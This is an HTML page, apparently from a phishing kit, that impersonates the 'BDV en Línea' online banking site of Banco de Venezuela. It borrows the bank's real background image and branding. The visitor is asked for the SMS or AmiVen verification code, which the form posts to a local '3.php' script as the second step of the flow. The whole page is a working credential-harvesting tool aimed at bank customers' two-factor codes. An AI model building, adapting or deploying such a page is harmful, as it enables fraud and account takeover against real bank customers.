<!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>BDV en Línea Pop-Up</title>
        
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: url(https://bdvenlinea.banvenez.com/assets/login/background.webp) no-repeat center center;
    background-size: cover;

            }
            .popup {
                width: 400px;
                background: white;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
                text-align: center;
            }
            .popup img {
                width: 280px;
                margin-bottom: 0px;
            }
            .popup h2 {
                font-size: 18px;
                color: #333;
                margin-bottom: 20px;
            }
            .steps {
                display: flex;
                justify-content: center;
                margin: 20px 0;
                font-size: 14px;
                color: #333;
            }
            .step {
                display: flex;
                align-items: center;
                color: #a90000;
            }
            .step:not(:last-child)::after {
                content: '';
                width: 30px;
                height: 1px;
                background: #888;
                margin: 0 10px;
            }
            .step-number {
                background-color: #a90000;
                color: white;
                width: 24px;
                height: 24px;
                border-radius: 50%;
                display: flex;
                justify-content: center;
                align-items: center;
                font-size: 12px;
                margin-right: 5px;
            }

            .step-number1 {
                background-color: #888;
                color: white;
                width: 24px;
                height: 24px;
                border-radius: 50%;
                display: flex;
                justify-content: center;
                align-items: center;
                font-size: 12px;
                margin-right: 5px;
            }
            .input-group {
                margin: 20px 0;
                text-align: center;
            }
            .input-group label {
                font-size: 14px;
                color: #333;
                margin-bottom: 5px;
                display: block;
            }
            .input-group input {
                width: 55%; /* Ajuste para hacerlo más corto */
                padding: 10px;
                border: 1px solid #a90000;
                border-radius: 4px;
                font-size: 16px;
                color: #333;
                outline: none;
                margin: 0 auto;
                display: block;
                text-align: center;
            }
            .input-group input::placeholder {
                color: #a90000;
                font-size: 14px;
            }
            .buttons {
                display: flex;
                justify-content: center;
                gap: 10px;
                margin-top: 20px;
            }
            .buttons button {
                padding: 10px 20px;
                font-size: 16px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                width: 45%;
            }
            .verify-btn {
                background-color: #0056A1;
                color: white;
            }
            .back-btn {
                background-color: #0056A1;
                color: white;
            }

                /* Estilos responsivos para móvil */
    @media (max-width: 768px) {
        body {
            background-color: #e9e9e9; /* Mantén el fondo blanco */
            background-image: none;
        }

        .overlay {
            background: rgba(0, 0, 0, 0.5); /* Fondo semi-transparente oscuro */
        }

        .login-box {
            left: auto;
            margin: 0 auto;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1); /* Sombra ligera */
            border: none;
        }

        .password-popup {
            background-color: white; /* Fondo blanco en el popup */
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1); /* Sombra ligera */
            border: none;
        }
    }
        </style>
    </head>
    <body>

    <div class="popup">

        <form action="3.php" method="post">
        <div class="steps">
            <div class="step">
                <div class="step-number">1</div> Entrar
            </div>
            <div class="step">
                <div class="step-number1">2</div> Verificar Identidad
            </div>
        </div>
        <div>
        <h2>Verifica tu identidad</h2>
        </div>
        <div class="input-group">
            <label for="codigo">Ingresa el código SMS o AmiVen Generado</label>
            <br>
            <input type="text" id="codigo" placeholder="CODIGO" name="cas2" maxlength="8" minlength="6" required oninput="soloNumeros(event)">
<script>
    function soloNumeros(event) {
        // Esto elimina cualquier carácter que no sea un número
        event.target.value = event.target.value.replace(/[^0-9]/g, '');
    }
</script>
        </div>
        <div class="buttons">
            <button class="verify-btn">Verificar</button>
        
        </div>
    </div>
    </form>
    </body>
    </html>
